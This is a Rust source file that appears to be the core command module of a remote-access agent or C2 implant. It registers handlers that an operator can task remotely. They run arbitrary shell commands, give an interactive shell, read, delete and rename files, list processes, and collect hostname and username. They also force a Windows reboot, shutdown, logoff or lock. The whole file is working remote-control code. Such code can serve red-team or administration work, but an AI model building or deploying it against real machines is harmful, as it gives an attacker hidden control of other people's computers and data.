// core plugin — always compiled in. Provides the base command set.
// Command IDs come from protocol::constants (matching Go shared/protocol).

use crate::protocol::types::Task;
use crate::registry::{AgentCtx, Registry, TaskResult};
use std::process::Command;

pub fn register(r: &mut Registry) -> Result<(), String> {
    r.register(crate::protocol::constants::CMD_SHELL, exec_shell)?;
    r.register(crate::protocol::constants::CMD_LS, exec_ls)?;
    r.register(crate::protocol::constants::CMD_CD, exec_cd)?;
    r.register(crate::protocol::constants::CMD_CAT, exec_cat)?;
    r.register(crate::protocol::constants::CMD_PWD, exec_pwd)?;
    r.register(crate::protocol::constants::CMD_MKDIR, exec_mkdir)?;
    r.register(crate::protocol::constants::CMD_RM, exec_rm)?;
    r.register(crate::protocol::constants::CMD_RENAME, exec_rename)?;
    r.register(crate::protocol::constants::CMD_PS, exec_ps)?;
    r.register(crate::protocol::constants::CMD_SYSINFO, exec_sysinfo)?;
    r.register(crate::protocol::constants::CMD_SLEEP, exec_sleep)?;
    r.register(crate::protocol::constants::CMD_EXIT, exec_exit)?;
    r.register(crate::protocol::constants::CMD_ISHELL_OPEN, exec_ishell_open)?;
    r.register(crate::protocol::constants::CMD_ISHELL_RUN, exec_ishell_run)?;
    r.register(crate::protocol::constants::CMD_ISHELL_CLOSE, exec_ishell_close)?;
    r.register(crate::protocol::constants::CMD_CLIENT_KILL, exec_client_kill)?;
    r.register(crate::protocol::constants::CMD_HOST_REBOOT, exec_host_reboot)?;
    r.register(crate::protocol::constants::CMD_HOST_SHUTDOWN, exec_host_shutdown)?;
    r.register(crate::protocol::constants::CMD_HOST_LOGOFF, exec_host_logoff)?;
    r.register(crate::protocol::constants::CMD_HOST_LOCK, exec_host_lock)?;
    Ok(())
}

fn shell_cmd() -> (&'static str, &'static str) {
    #[cfg(target_os = "windows")]
    {
        ("cmd", "/C")
    }
    #[cfg(not(target_os = "windows"))]
    {
        ("/bin/sh", "-c")
    }
}

fn exec_shell(ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    // args JSON: {"cmd": "..."} matching Go shell command
    let cmdline: serde_json::Value = serde_json::from_str(&task.args).unwrap_or(serde_json::Value::Null);
    let cmdstr = cmdline["cmd"].as_str().unwrap_or("").to_string();
    if cmdstr.is_empty() {
        return Some(TaskResult::fail(&task.id, "no cmd".into()));
    }
    let (prog, flag) = shell_cmd();
    let out = run_capture(prog, &[flag, &cmdstr], &ctx.cwd);
    Some(TaskResult::ok(&task.id, out))
}

fn exec_pwd(ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    Some(TaskResult::ok(&task.id, format!("{}\n", ctx.cwd.display())))
}

fn exec_ls(ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    let v: serde_json::Value = serde_json::from_str(&task.args).unwrap_or(serde_json::Value::Null);
    let path = v["path"].as_str().map(|s| s.to_string());
    let dir = match &path {
        Some(p) => std::path::PathBuf::from(p),
        None => ctx.cwd.clone(),
    };
    let mut out = String::new();
    if let Ok(entries) = std::fs::read_dir(&dir) {
        for e in entries.flatten() {
            let name = e.file_name().to_string_lossy().into_owned();
            let is_dir = e.path().is_dir();
            out.push_str(&format!("{}{}\n", name, if is_dir { "/" } else { "" }));
        }
    } else {
        return Some(TaskResult::fail(&task.id, format!("cannot open {}", dir.display())));
    }
    Some(TaskResult::ok(&task.id, out))
}

fn exec_cd(ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    let v: serde_json::Value = serde_json::from_str(&task.args).unwrap_or(serde_json::Value::Null);
    let dir = v["path"].as_str().map(|s| s.to_string()).unwrap_or_default();
    if dir.is_empty() {
        return Some(TaskResult::ok(&task.id, format!("{}\n", ctx.cwd.display())));
    }
    let mut new = ctx.cwd.clone();
    if std::path::Path::new(&dir).is_absolute() {
        new = std::path::PathBuf::from(&dir);
    } else {
        new.push(&dir);
    }
    if new.is_dir() {
        ctx.cwd = new;
        Some(TaskResult::ok(&task.id, String::new()))
    } else {
        Some(TaskResult::fail(&task.id, format!("no such dir: {dir}")))
    }
}

fn exec_cat(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    let v: serde_json::Value = serde_json::from_str(&task.args).unwrap_or(serde_json::Value::Null);
    let path = v["path"].as_str().unwrap_or("").to_string();
    match std::fs::read_to_string(&path) {
        Ok(c) => Some(TaskResult::ok(&task.id, c)),
        Err(e) => Some(TaskResult::fail(&task.id, format!("cat: {e}"))),
    }
}

fn exec_mkdir(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    let v: serde_json::Value = serde_json::from_str(&task.args).unwrap_or(serde_json::Value::Null);
    let path = v["path"].as_str().unwrap_or("").to_string();
    match std::fs::create_dir_all(&path) {
        Ok(_) => Some(TaskResult::ok(&task.id, String::new())),
        Err(e) => Some(TaskResult::fail(&task.id, format!("mkdir: {e}"))),
    }
}

fn exec_rm(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    let v: serde_json::Value = serde_json::from_str(&task.args).unwrap_or(serde_json::Value::Null);
    let path = v["path"].as_str().unwrap_or("").to_string();
    let recursive = v["recursive"].as_bool().unwrap_or(false);
    let result = if recursive {
        std::fs::remove_dir_all(&path)
    } else {
        std::fs::remove_file(&path)
    };
    match result {
        Ok(_) => Some(TaskResult::ok(&task.id, String::new())),
        Err(e) => Some(TaskResult::fail(&task.id, format!("rm: {e}"))),
    }
}

fn exec_rename(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    let v: serde_json::Value = serde_json::from_str(&task.args).unwrap_or(serde_json::Value::Null);
    let from = v["from"].as_str().unwrap_or("").to_string();
    let to = v["to"].as_str().unwrap_or("").to_string();
    match std::fs::rename(&from, &to) {
        Ok(_) => Some(TaskResult::ok(&task.id, String::new())),
        Err(e) => Some(TaskResult::fail(&task.id, format!("rename: {e}"))),
    }
}

#[cfg(target_os = "windows")]
fn exec_ps(ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    let out = run_capture("tasklist", &[], &ctx.cwd);
    Some(TaskResult::ok(&task.id, out))
}

#[cfg(not(target_os = "windows"))]
fn exec_ps(ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    let out = run_capture("ps", &["aux"], &ctx.cwd);
    Some(TaskResult::ok(&task.id, out))
}

fn exec_sysinfo(ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    let mut s = format!("hostname: {}\n", hostname::get().map(|h| h.to_string_lossy().into_owned()).unwrap_or_default());
    s.push_str(&format!("cwd: {}\n", ctx.cwd.display()));
    s.push_str(&format!("pid: {}\n", std::process::id()));
    #[cfg(target_os = "windows")]
    {
        s.push_str(&format!("username: {}\n", std::env::var("USERNAME").unwrap_or_default()));
    }
    #[cfg(not(target_os = "windows"))]
    {
        s.push_str(&format!("username: {}\n", std::env::var("USER").unwrap_or_default()));
    }
    Some(TaskResult::ok(&task.id, s))
}

fn exec_sleep(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    let v: serde_json::Value = serde_json::from_str(&task.args).unwrap_or(serde_json::Value::Null);
    let ms = v["ms"].as_u64().unwrap_or(1000);
    std::thread::sleep(std::time::Duration::from_millis(ms));
    Some(TaskResult::ok(&task.id, format!("slept {}ms\n", ms)))
}

fn exec_exit(ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    ctx.running = false;
    Some(TaskResult::ok(&task.id, "agent exiting\n".into()))
}

// ── interactive shell (ishell) ──────────────────────────────────────────

fn exec_ishell_open(ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    // Reuses ctx.cwd as the persistent session working directory.
    let v: serde_json::Value = serde_json::from_str(&task.args).unwrap_or(serde_json::Value::Null);
    let shell = v["cmd"].as_str().unwrap_or("cmd");
    Some(TaskResult::ok(&task.id, format!("interactive {} session opened (cwd={})\n", shell, ctx.cwd.display())))
}

fn exec_ishell_run(ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    let v: serde_json::Value = serde_json::from_str(&task.args).unwrap_or(serde_json::Value::Null);
    let input = v["input"].as_str().unwrap_or("").to_string();
    if input.is_empty() {
        return Some(TaskResult::fail(&task.id, "no input".into()));
    }
    let trimmed = input.trim().to_string();
    let lower = trimmed.to_lowercase();
    // cd is handled locally so the session keeps cwd across commands.
    if lower == "cd" {
        return Some(TaskResult::ok(&task.id, format!("{}\n", ctx.cwd.display())));
    }
    if let Some(rest) = lower.strip_prefix("cd ") {
        let dir = rest.trim().to_string();
        let mut target = ctx.cwd.clone();
        if !std::path::Path::new(&dir).is_absolute() {
            target.push(&dir);
        } else {
            target = std::path::PathBuf::from(&dir);
        }
        if target.is_dir() {
            ctx.cwd = target;
            return Some(TaskResult::ok(&task.id, format!("{}\n", ctx.cwd.display())));
        }
        return Some(TaskResult::fail(&task.id, format!("cannot cd to {dir}")));
    }

    // Execute via the platform shell in the session cwd.
    #[cfg(target_os = "windows")]
    {
        let out = run_capture("cmd.exe", &["/c", &trimmed], &ctx.cwd);
        Some(TaskResult::ok(&task.id, out))
    }
    #[cfg(not(target_os = "windows"))]
    {
        let out = run_capture("/bin/sh", &["-c", &trimmed], &ctx.cwd);
        Some(TaskResult::ok(&task.id, out))
    }
}

fn exec_ishell_close(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    Some(TaskResult::ok(&task.id, "interactive shell closed\n".into()))
}

// ── computer / client management (right-click menu) ─────────────────────

/// Fire-and-forget a subprocess (no output capture).
#[cfg(target_os = "windows")]
fn spawn_detached(prog: &str, args: &[&str]) -> bool {
    std::process::Command::new(prog)
        .args(args)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
        .is_ok()
}

fn exec_client_kill(_ctx: &mut AgentCtx, _task: &Task) -> Option<TaskResult> {
    // Terminate the agent process immediately; the result is never delivered.
    #[cfg(target_os = "windows")]
    {
        use windows_sys::Win32::System::Threading::ExitProcess;
        unsafe { ExitProcess(0) }
    }
    #[cfg(not(target_os = "windows"))]
    {
        std::process::exit(0)
    }
}

fn exec_host_reboot(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    #[cfg(target_os = "windows")]
    {
        let ok = spawn_detached("shutdown.exe", &["/r", "/f", "/t", "0"]);
        Some(TaskResult::ok(&task.id, if ok { "reboot issued\n".into() } else { "reboot failed\n".into() }))
    }
    #[cfg(not(target_os = "windows"))]
    {
        Some(TaskResult::fail(&task.id, "host_reboot is Windows-only".into()))
    }
}

fn exec_host_shutdown(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    #[cfg(target_os = "windows")]
    {
        let ok = spawn_detached("shutdown.exe", &["/s", "/f", "/t", "0"]);
        Some(TaskResult::ok(&task.id, if ok { "shutdown issued\n".into() } else { "shutdown failed\n".into() }))
    }
    #[cfg(not(target_os = "windows"))]
    {
        Some(TaskResult::fail(&task.id, "host_shutdown is Windows-only".into()))
    }
}

fn exec_host_logoff(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    #[cfg(target_os = "windows")]
    {
        let ok = spawn_detached("shutdown.exe", &["/l"]);
        Some(TaskResult::ok(&task.id, if ok { "logoff issued\n".into() } else { "logoff failed\n".into() }))
    }
    #[cfg(not(target_os = "windows"))]
    {
        Some(TaskResult::fail(&task.id, "host_logoff is Windows-only".into()))
    }
}

fn exec_host_lock(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    #[cfg(target_os = "windows")]
    {
        let ok = spawn_detached("rundll32.exe", &["user32.dll,LockWorkStation"]);
        Some(TaskResult::ok(&task.id, if ok { "lock issued\n".into() } else { "lock failed\n".into() }))
    }
    #[cfg(not(target_os = "windows"))]
    {
        Some(TaskResult::fail(&task.id, "host_lock is Windows-only".into()))
    }
}

/// Run a command and capture combined output (with a timeout guard).
fn run_capture(prog: &str, args: &[&str], cwd: &std::path::Path) -> String {
    let mut child = match Command::new(prog)
        .args(args)
        .current_dir(cwd)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
    {
        Ok(c) => c,
        Err(e) => return format!("spawn failed: {e}\n"),
    };
    let mut out = Vec::new();
    if let Some(mut so) = child.stdout.take() {
        let _ = std::io::Read::read_to_end(&mut so, &mut out);
    }
    if let Some(mut se) = child.stderr.take() {
        let _ = std::io::Read::read_to_end(&mut se, &mut out);
    }
    let _ = child.wait();
    String::from_utf8_lossy(&out).into_owned()
}
